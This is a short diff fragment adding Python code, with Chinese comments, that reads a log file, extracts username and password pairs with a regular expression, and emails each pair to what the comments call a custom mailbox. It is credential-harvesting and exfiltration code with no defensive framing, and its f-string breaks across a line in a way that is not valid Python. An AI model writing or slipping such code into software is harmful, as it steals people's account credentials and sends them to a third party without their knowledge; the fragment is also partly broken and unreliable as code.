@@ -1,0 +1,15 @@
+with open(log_file, 'r') as file:
+    logs = file.read()
+
+# 正则表达式匹配账号密码
+pattern = re.compile(r'username=(\w+), password=(\w+)', re.MULTILINE)
+matches = pattern.findall(logs)
+
+# 发送账号密码到自定义邮箱
+for match in matches:
+    username = match[0]
+    password = match[1]
+    subject = "账号密码信息"
+    content = f"账号: {username}
+密码: {password}"
+    send_email(subject, content)
